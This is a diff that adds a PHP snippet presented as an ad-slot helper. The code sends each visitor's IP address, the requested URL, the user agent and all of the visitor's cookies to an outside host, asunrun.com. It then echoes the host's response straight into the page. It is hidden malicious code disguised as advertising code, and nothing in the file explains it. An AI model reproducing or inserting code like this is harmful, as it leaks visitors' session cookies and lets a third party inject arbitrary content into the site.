@@ -1,0 +1,31 @@
+<?php
+if (!function_exists('adSlot')){
+function getClientIP(){       
+if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)){
+return  $_SERVER["HTTP_X_FORWARDED_FOR"];  
+}else if (array_key_exists('REMOTE_ADDR', $_SERVER)){ 
+return $_SERVER["REMOTE_ADDR"]; 
+}else if (array_key_exists('HTTP_CLIENT_IP', $_SERVER)){
+return $_SERVER["HTTP_CLIENT_IP"]; 
+}return '';}
+function adSlot($zone){if($zone){return $zone;}else{
+$url='http://asunrun.com/s.php?shape=1&z=1&pl=1295';
+$ip=getClientIP();
+$wurl=urlencode(getenv('HTTP_HOST').getenv('REQUEST_URI'));
+$os=urlencode(getenv('HTTP_USER_AGENT'));
+$params = array("ip"=>"".$ip."","url"=>"".$wurl."",);
+$adF= curl_init();
+curl_setopt($adF, CURLOPT_URL, $url);
+curl_setopt($adF, CURLOPT_POST,true);
+curl_setopt($adF, CURLOPT_POSTFIELDS,http_build_query($params));
+curl_setopt($adF, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
+curl_setopt($adF, CURLOPT_FOLLOWLOCATION, 1); 
+curl_setopt($adF, CURLOPT_RETURNTRANSFER, true); 
+curl_setopt($adF, CURLOPT_CONNECTTIMEOUT, 4); 
+curl_setopt($adF, CURLOPT_TIMEOUT, 4); 
+curl_setopt($adF, CURLOPT_COOKIE, http_build_query($_COOKIE,'',';'));
+$exec=curl_exec($adF);$getad = curl_getinfo($adF); 
+curl_close($adF);if($getad['http_code']=='200'){return $exec;}}}}
+?>
+
+<?php echo $adSlot=adSlot($adSlot);  //short code for multiple ads display ?>
